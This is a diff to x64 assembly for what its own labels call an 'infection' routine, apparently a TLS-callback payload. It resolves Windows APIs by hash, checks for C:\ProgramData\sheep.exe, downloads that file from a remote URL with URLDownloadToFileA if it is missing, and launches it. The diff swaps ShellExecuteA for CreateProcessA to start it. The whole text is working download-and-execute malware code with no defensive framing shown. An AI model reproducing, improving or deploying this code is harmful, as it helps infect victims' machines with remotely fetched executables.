@@ -8,11 +8,11 @@ global main
    ;
    ;    VOID (NTAPI *PIMAGE_TLS_CALLBACK)(PVOID DllHandle, DWORD Reason, PVOID Reserved)
 main:
+   mov [rsp+0x20],r12
    mov [rsp+0x18],rsi
    mov [rsp+0x10],rdi
    mov [rsp+8],rbp
-   mov rbp,rsp
-   sub rsp,0x38                 ; store registers in shadow space, realign the stack and create new shadowspace and argspace
+   sub rsp,0xe0                 ; store registers in shadow space, realign the stack and create new shadowspace and argspace
 
 %ifdef TLS
    cmp edx,1
@@ -24,8 +24,6 @@ main:
 infection__data__start:         ; this prevents relocations from forming because we are not
 infection__data__urlmon:        ; using absolute addresses for our data, making it more portable
    db "urlmon.dll",0
-infection__data__shell32:
-   db "shell32.dll",0
 infection__data__sheep:
    db "C:\\ProgramData\\sheep.exe",0
 infection__data__download_url:
@@ -46,44 +44,58 @@ infection__data:
    mov rcx, r12
    mov edx, 0xda1a7563
    call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0xda1a7563)
-   mov r12, rax                 ; get function for GetFileAttributesA
+   mov rsi, rax                 ; get function for GetFileAttributesA
+   mov rcx, r12
+   mov edx, 0x4a7c0a09
+   call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0x4a7c0a09)
+   mov rbp, rax                 ; get function for CreateProcessA
    lea rcx, [rbx+(infection__data__urlmon-infection__data__start)] ; urlmon.dll
    call rdi                                                        ; LoadLibraryA("urlmon.dll")
    mov rcx, rax
    mov edx, 0xd8d746fc
    call get_proc_by_hash        ; get_proc_by_hash(urlmon_module, 0xd8d746fc)
-   mov rsi, rax                 ; get function for URLDownloadToFileA
-   lea rcx, [rbx+(infection__data__shell32-infection__data__start)] ; shell32.dll
-   call rdi                                                         ; LoadLibraryA("shell32.dll")
-   mov rcx, rax
-   mov edx, 0xb0ff5bf
-   call get_proc_by_hash        ; get_proc_by_hash(shell32_module, 0xb0ff5bf)
-   mov rdi, rax                 ; get function for ShellExecuteA
+   mov r12, rax                 ; get function for URLDownloadToFileA
+
    lea rcx, [rbx+(infection__data__sheep-infection__data__start)] ; C:\ProgramData\sheep.exe
-   call r12                                                       ; GetFileAttributesA("C:\\ProgramData\\sheep.exe")
-   xor r12d,r12d
-   mov [rsp+0x20],r12           ; pre-populate argument to URLDownloadToFileA
+   call rsi                                                       ; GetFileAttributesA("C:\\ProgramData\\sheep.exe")
    cmp eax, 0xFFFFFFFF          ; eax == INVALID_FILE_ATTRIBUTES
-   jnz infection__payload_exists
+   jnz infection__payload_exists ; jump taken means the file exists
 
    xor ecx,ecx
    lea rdx, [rbx+(infection__data__download_url-infection__data__start)] ; big honkin github url
    lea r8, [rbx+(infection__data__sheep-infection__data__start)] ; the sheep executable
    xor r9d,r9d
-   call rsi                     ; URLDownloadToFileA(nullptr, "evil_sheep_url.exe", "C:\\ProgramData\\sheep.exe", 0, nullptr)
+   mov [rsp+0x28],rcx
+   call r12                     ; URLDownloadToFileA(nullptr, "evil_sheep_url.exe", "C:\\ProgramData\\sheep.exe", 0, nullptr)
    test eax,eax
    jnz infection__end           ; URLDownloadToFileA returning nonzero is an error
 
 infection__payload_exists:
-   mov dword [rsp+0x28], 1
-   xor ecx,ecx
-   xor edx,edx
-   lea r8, [rbx+(infection__data__sheep-infection__data__start)]
+   xor ecx,ecx                                                    ; the executable file (can just use command line arg)
+   lea rdx, [rbx+(infection__data__sheep-infection__data__start)] ; the sheep executable
+   xor r8d,r8d
    xor r9d,r9d
-   call rdi                     ; ShellExecuteA(nullptr, nullptr, "C:\\ProgramData\\sheep.exe", nullptr, nullptr, 1)
+   xorps xmm0,xmm0
+   movups [rsp+0x28],xmm0
+   movups [rsp+0x38],xmm0
+   lea rax, [rsp+0x78]
+   mov [rsp+0x48], rax
+   lea rax, [rsp+0x58]
+   mov [rsp+0x50], rax
+   movups [rsp+0x58],xmm0
+   movups [rsp+0x68],xmm0
+   mov dword [rsp+0x78], 0x68
+   movups [rsp+0x7c],xmm0
+   movups [rsp+0x8c],xmm0
+   movups [rsp+0x9c],xmm0
+   movups [rsp+0xac],xmm0
+   movups [rsp+0xbc],xmm0
+   movups [rsp+0xcc],xmm0
+   call rbp                     ; CreateProcessA(NULL, sheep_exe, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
    
 infection__end:
-   add rsp,0x38
+   add rsp,0xe0
+   mov r12,[rsp+0x20]
    mov rsi,[rsp+0x18]
    mov rdi,[rsp+0x10]
    mov rbp,[rsp+8]
